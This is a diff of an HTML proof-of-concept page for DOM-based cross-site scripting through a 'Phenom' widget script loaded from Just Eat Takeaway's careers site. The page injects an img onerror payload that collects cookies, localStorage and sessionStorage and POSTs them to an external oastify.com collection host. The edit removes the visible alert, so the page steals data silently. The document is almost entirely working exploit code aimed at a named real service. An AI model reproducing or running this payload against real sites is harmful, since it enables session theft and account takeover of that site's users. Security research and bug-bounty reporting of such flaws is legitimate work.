@@ -1,15 +1,15 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>🔥 Just Eat Widget XSS PoC</title>
+  <title>🔥 XSS PoC – Phenom Widget</title>
 </head>
 <body>
-  <h2>DOM-Based XSS in Just Eat Widget</h2>
+  <h2>🔥 DOM-Based XSS via Just Eat / Phenom Widget</h2>
 
-  <!-- 👇 Malicious widget injection -->
-  <div class="ph-widget" as-element="evilWidget">
-    <img src=x onerror="
-      const exfil = {
+  <!-- Malicious widget injection -->
+  <div class="ph-widget" as-element="xssWidget">
+    <img src="x" onerror="
+      const data = {
         cookie: document.cookie,
         localStorage: JSON.stringify(localStorage),
         sessionStorage: JSON.stringify(sessionStorage),
@@ -19,16 +19,16 @@
       fetch('https://ykmkw5n8la7rld89saeryu121t7mvcj1.oastify.com', {
         method: 'POST',
         mode: 'no-cors',
-        body: JSON.stringify(exfil)
+        body: JSON.stringify(data)
       });
-      alert('✅ DOM XSS Triggered!');
     ">
   </div>
 
-  <!-- 👇 Load vulnerable enhancer -->
-  <script src='https://careers.justeattakeaway.com/global/en/phenomtrack.min.js'></script>
+  <!-- Load vulnerable enhancer (required for widget parsing) -->
+  <script src="https://careers.justeattakeaway.com/global/en/phenomtrack.min.js"></script>
   <script>
-    window.PhEnhancer && PhEnhancer();
+    // Trigger the widget rendering
+    PhEnhancer && PhEnhancer();
   </script>
 </body>
 </html>
